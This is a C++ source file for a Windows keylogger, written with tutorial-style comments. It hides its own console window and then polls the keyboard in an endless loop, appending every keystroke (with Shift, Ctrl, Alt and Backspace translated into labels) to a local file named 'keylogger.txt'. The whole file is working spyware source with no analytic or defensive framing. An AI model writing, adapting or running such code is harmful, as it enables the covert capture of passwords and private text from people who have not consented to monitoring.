#include <iostream>
#include <fstream>
#include <windows.h>
#include <bits/stdc++.h>

// Log file path
#define LOG_FILE "keylogger.txt"

// Save data into log file
void saveData(std::string data) {
    std::fstream logFile;

    // Open file
    // std::ios::app will make the new data append to the file instead if erase file content
    // and then write to it
    logFile.open(LOG_FILE, std::ios::app);

    // Write data into log file
    logFile << data;

    // Close file stream
    logFile.close();
}

// Translate special key int into string
std::string translateSpecialKey(int key) {
    std:: string result;

    switch (key)
    {
    case VK_SPACE:
        // Space key
        result = " ";
        break;
    case VK_RETURN:
        // New line key
        // Or enter
        result = "\n";
        break;
    case VK_BACK:
        // Backspace key
        result = "[BACKSPCACE]";
        break;
    case VK_CAPITAL:
        // CAPSLOCK key
        result = "[CAPS_LOCK]";
        break;
    case VK_SHIFT:
        // Shift key
        result = "[SHIFT]";
        break;
    case VK_TAB:
        // Tab key
        result = "[TAB]";
        break;
    case VK_CONTROL:
        // Control key
        result = "[CTRL]";
        break;
    case VK_MENU:
        // ALT key
        result = "[ALT]";
        break;
    default:
        break;
    }

    return result;
}

int main() {

    int specialKeyArray[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB, VK_CONTROL, VK_MENU, VK_CAPITAL};
    std::string specialKeyChar;
    bool isSpecialKey;

    // Hide terminal window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // Loop forever
    while (true) {
        // Loop through each key
        for (int key = 8; key <= 190; key++) {
            // Check key is pressed
            if (GetAsyncKeyState(key) == -32767) {
                // Key is pressed
                // Check if key is special key
                isSpecialKey = std::find(std::begin(specialKeyArray), std::end(specialKeyArray), key) != std::end(specialKeyArray);
                if (isSpecialKey) {
                    // This is a special key. We need to translate it!
                    specialKeyChar = translateSpecialKey(key);
                    // Save data
                    saveData(specialKeyChar);
                } else {
                    // This is not a special key. We need to check if it is uppercase or lowercase
                    if (GetKeyState(VK_CAPITAL)) {
                        // CAPSLOCK is on
                        saveData(std::string(1,(char)key));
                    } else {
                        // CAPSLOCK is off
                        // Turn the character into lowercase before save
                        saveData(std::string(1, (char)std::tolower(key)));
                    }
                }
            }
        }
    }
    return 0;
}